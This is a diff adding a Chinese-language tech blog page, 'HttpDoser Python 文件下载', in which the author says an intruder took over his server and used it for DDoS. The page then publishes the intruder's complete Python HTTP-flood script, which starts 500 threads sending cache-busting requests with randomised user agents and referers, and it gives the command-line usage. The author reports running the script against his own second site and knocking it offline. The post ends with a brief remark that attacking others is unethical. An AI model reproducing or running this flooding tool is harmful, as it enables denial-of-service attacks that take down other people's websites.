@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="theme-color" content="#2d494e">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <script type="text/javascript">
+    var host = "rednik.xyz";
+    if ((host == window.location.host) && (window.location.protocol != "https:"))
+        window.location.protocol = "https";
+</script>
+    <link rel="canonical" href=" { { site.url } }{ { page.url } }" />
+ <script type="text/javascript">
+    var host = "rednik.xyz";
+    if ((host == window.location.host) && (window.location.protocol != "https:"))
+        window.location.protocol = "https";
+</script>
+    
+
+    <title>
+      HttpDoser Python 文件下载 | Xia Hua&#39;s Tech Blog 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="Xia Hua">
+    
+    
+
+    <meta name="description" content="Interesting！网站在我没有完善安全措施的时候就有黑客入侵本网站且改了密码。并且利用本主机对其他网站进行了DDOS 攻击，实在是太有趣了。
+现在公开一下黑客使用代码的参数，这个代码执行了之后可以对网站进行DDOS攻击。我的另外一个网站rednik.pw， 处于我的好奇，使用了这一个脚本文件，使用完毕之后发现网站打不开了，是在是太有趣了。
+参数：python HttpDoser.py XXX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HttpDoser Python 文件下载 | Xia Hua's Tech Blog">
+<meta property="og:url" content="https://csxiahua.com/2016/11/26/HttpDoser-Python-文件下载/index.html">
+<meta property="og:site_name" content="Xia Hua's Tech Blog">
+<meta property="og:description" content="Interesting！网站在我没有完善安全措施的时候就有黑客入侵本网站且改了密码。并且利用本主机对其他网站进行了DDOS 攻击，实在是太有趣了。
+现在公开一下黑客使用代码的参数，这个代码执行了之后可以对网站进行DDOS攻击。我的另外一个网站rednik.pw， 处于我的好奇，使用了这一个脚本文件，使用完毕之后发现网站打不开了，是在是太有趣了。
+参数：python HttpDoser.py XXX">
+<meta property="og:updated_time" content="2016-11-26T20:12:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HttpDoser Python 文件下载 | Xia Hua's Tech Blog">
+<meta name="twitter:description" content="Interesting！网站在我没有完善安全措施的时候就有黑客入侵本网站且改了密码。并且利用本主机对其他网站进行了DDOS 攻击，实在是太有趣了。
+现在公开一下黑客使用代码的参数，这个代码执行了之后可以对网站进行DDOS攻击。我的另外一个网站rednik.pw， 处于我的好奇，使用了这一个脚本文件，使用完毕之后发现网站打不开了，是在是太有趣了。
+参数：python HttpDoser.py XXX">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Xia Hua&#39;s Tech Blog</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          Since 2016
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">Blog</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">About</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">Archive</a></li>
+              
+                
+                <li class="navigation__item"><a href="/friends" title="" class="">Friends&lt;3</a></li>
+              
+                
+                <li class="navigation__item"><a href="/categories" title="" class="">Categories</a></li>
+              
+                
+                <li class="navigation__item"><a href="/tags" title="" class="">Tags</a></li>
+              
+                
+                <li class="navigation__item"><a href="/coupon" title="" class="">Coupon</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/tonyxiahua" title="Rednik on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+      <!-- Linkedin -->
+      <li class="navigation__item">
+        <a href="https://www.linkedin.com/in/hua-xia-13a71711b" title="Rednik on Linkedin">
+          <i class='icon icon-social-linkedin'></i>
+          <span class="label">Linkedin</span>
+        </a>
+      </li>
+    <!-- China social icon -->
+    <!-- Weibo-->
+      <li class="navigation__item">
+        <a href="http://weibo.com/" title="Xia Hua on Weibo">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+      <li class="navigation__item">
+        <a href="mailto:contact@csxiahua.com" title="e-mail me"
+         <i class='icon icon-mail'></i>
+         <span class="label">mail</span>
+        </a>
+      </li>    
+
+  </ul>
+</nav>
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">HttpDoser Python 文件下载</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-11-26" class="post-meta__date date">2016-11-26</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/Linux/">Linux</a>, <a class="tags-link" href="/tags/树莓派/">树莓派</a>, <a class="tags-link" href="/tags/网络/">网络</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="Interesting！"><a href="#Interesting！" class="headerlink" title="Interesting！"></a>Interesting！</h3><p>网站在我没有完善安全措施的时候就有黑客入侵本网站且改了密码。并且利用本主机对其他网站进行了DDOS 攻击，实在是太有趣了。</p>
+<p>现在公开一下黑客使用代码的参数，这个代码执行了之后可以对网站进行DDOS攻击。我的另外一个网站rednik.pw， 处于我的好奇，使用了这一个脚本文件，使用完毕之后发现网站打不开了，是在是太有趣了。</p>
+<p>参数：<br>python HttpDoser.py XXXXXXXXXXXXXX   －XXXXXXXXXXXXX意为攻击的网站。</p>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre><code>import urllib2
+import sys
+import threading
+import random
+import re
+
+#global params
+url=&apos;&apos;
+host=&apos;&apos;
+headers_useragents=[]
+headers_referers=[]
+request_counter=0
+flag=0
+safe=0
+
+def inc_counter():
+    global request_counter
+    request_counter+=1
+
+def set_flag(val):
+    global flag
+    flag=val
+
+def set_safe():
+    global safe
+    safe=1
+
+# generates a user agent array
+def useragent_list():
+    global headers_useragents
+    headers_useragents.append(&apos;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3&apos;)
+    headers_useragents.append(&apos;Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)&apos;)
+    headers_useragents.append(&apos;Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)&apos;)
+    headers_useragents.append(&apos;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1&apos;)
+    headers_useragents.append(&apos;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1&apos;)
+    headers_useragents.append(&apos;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)&apos;)
+    headers_useragents.append(&apos;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)&apos;)
+    headers_useragents.append(&apos;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)&apos;)
+    headers_useragents.append(&apos;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)&apos;)
+    headers_useragents.append(&apos;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)&apos;)
+    headers_useragents.append(&apos;Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)&apos;)
+    headers_useragents.append(&apos;Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51&apos;)
+    return(headers_useragents)
+
+# generates a referer array
+def referer_list():
+    global headers_referers
+    headers_referers.append(&apos;http://www.google.com/?q=&apos;)
+    headers_referers.append(&apos;http://www.usatoday.com/search/results?q=&apos;)
+    headers_referers.append(&apos;http://engadget.search.aol.com/search?q=&apos;)
+    headers_referers.append(&apos;http://&apos; + host + &apos;/&apos;)
+    return(headers_referers)
+
+#builds random ascii string
+def buildblock(size):
+    out_str = &apos;&apos;
+    for i in range(0, size):
+        a = random.randint(65, 90)
+        out_str += chr(a)
+    return(out_str)
+
+def usage():
+    print &apos;---------------------------------------------------&apos;
+    print &apos;USAGE: python httpdoser.py &lt;url&gt;&apos;
+    print &apos;httpdoser website : DDoS Attack&apos;
+    print &quot;\a&quot;
+print \
+&quot;&quot;&quot;
+                   ...
+                 ;::::;   Http_Doser Starting...
+               ;::::; :;    By DDoS Attack
+             ;:::::&apos;   :;
+            ;:::::;     ;.
+           ,:::::&apos;       ;           OOO\
+           ::::::;       ;          OOOOO\
+           ;:::::;       ;         OOOOOOOO
+          ,;::::::;     ;&apos;         / OOOOOOO
+        ;:::::::::`. ,,,;.        /  / DOOOOOO
+      .&apos;;:::::::::::::::::;,     /  /     DOOOO
+     ,::::::;::::::;;;;::::;,   /  /        DOOO
+    ;`::::::`&apos;::::::;;;::::: ,#/  /          DOOO
+    :`:::::::`;::::::;;::: ;::#  /            DOOO
+    ::`:::::::`;:::::::: ;::::# /              DOO
+    `:`:::::::`;:::::: ;::::::#/               DOO
+     :::`:::::::`;; ;:::::::::##                OO
+     ::::`:::::::`;::::::::;:::#                OO
+     `:::::`::::::::::::;&apos;`:;::#                O
+      `:::::`::::::::;&apos; /  / `:#
+       ::::::`:::::;&apos;  /  /   `#
+
+&quot;&quot;&quot;
+print &apos;---------------------------------------------------&apos;
+
+
+#http request
+def httpcall(url):
+    useragent_list()
+    referer_list()
+    code=0
+    if url.count(&quot;?&quot;)&gt;0:
+        param_joiner=&quot;&amp;&quot;
+    else:
+        param_joiner=&quot;?&quot;
+    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + &apos;=&apos; + buildblock(random.randint(3,10)))
+    request.add_header(&apos;User-Agent&apos;, random.choice(headers_useragents))
+    request.add_header(&apos;Cache-Control&apos;, &apos;no-cache&apos;)
+    request.add_header(&apos;Accept-Charset&apos;, &apos;ISO-8859-1,utf-8;q=0.7,*;q=0.7&apos;)
+    request.add_header(&apos;Referer&apos;, random.choice(headers_referers) + buildblock(random.randint(5,10)))
+    request.add_header(&apos;Keep-Alive&apos;, random.randint(110,120))
+    request.add_header(&apos;Connection&apos;, &apos;keep-alive&apos;)
+    request.add_header(&apos;Host&apos;,host)
+    try:
+            urllib2.urlopen(request)
+    except urllib2.HTTPError, e:
+            #print e.code
+            set_flag(1)
+             print &apos;Flooding WebSite Port 80 with 65000-byte packets for 99999&apos;
+            code=500
+    except urllib2.URLError, e:
+            #print e.reason
+            sys.exit()
+    else:
+            inc_counter()
+            urllib2.urlopen(request)
+    return(code)        
+
+
+#http caller thread 
+class HTTPThread(threading.Thread):
+    def run(self):
+        try:
+            while flag&lt;2:
+                code=httpcall(url)
+                if (code==500) &amp; (safe==1):
+                    set_flag(2)
+        except Exception, ex:
+            pass
+
+# monitors http threads and counts requests
+class MonitorThread(threading.Thread):
+    def run(self):
+        previous=request_counter
+        while flag==0:
+            if (previous+100&lt;request_counter) &amp; (previous&lt;&gt;request_counter):
+                print &quot;%d Shots sends Senting&quot; % (request_counter)
+                previous=request_counter
+        if flag==2:
+            print &quot;\n -M60 Hits are secced&quot;
+
+#execute 
+if len(sys.argv) &lt; 2:
+    usage()
+    sys.exit()
+else:
+    if sys.argv[1]==&quot;help&quot;:
+        usage()
+        sys.exit()
+    else:
+        print &quot;Flooding WebSite Port 80 with 65000-byte packets for 99999 By DDoS Attack&quot;
+        if len(sys.argv)== 3:
+            if sys.argv[2]==&quot;safe&quot;:
+                set_safe()
+        url = sys.argv[1]
+        if url.count(&quot;/&quot;)==2:
+            url = url + &quot;/&quot;
+        m = re.search(&apos;http\://([^/]*)/?.*&apos;, url)
+        host = m.group(1)
+        for i in range(500):
+            t = HTTPThread()
+            t.start()
+        t = MonitorThread()
+        t.start()
+</code></pre><h3 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h3><p>当然，攻击他人电脑的行为是真的不道德，建议大家还是合理使用这段代码，说回被肉鸡，其实有很大的一部分原因是因为自己使用了弱口令，最近改了新密码，以后可能会会换成AWS的那种密匙登录，这样就万无一失了。</p>
+
+  </section>
+
+  
+
+<section class="post-comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+      var disqus_shortname = 'rednikxyz'; 
+      /* * * DON'T EDIT BELOW THIS LINE * * */
+      (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+  
+</article>
+
+
+            <footer class="footer">
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次，您的<a href="https://rednik.xyz/2016/10/18/Support/">赞助</a>是本网站持久运行的动力</span>
+    <span class="footer__copyright">&copy; 2014-2016 Rednik. Attribution, NonCommercial, ShareAlike <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons 4.0 International License. </a> | Powered by <a href="https://hexo.io/">Hexo</a> | Theme by <a href="https://github.com/someus/huno">Huno</a></span>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-79198459-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+    
+
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
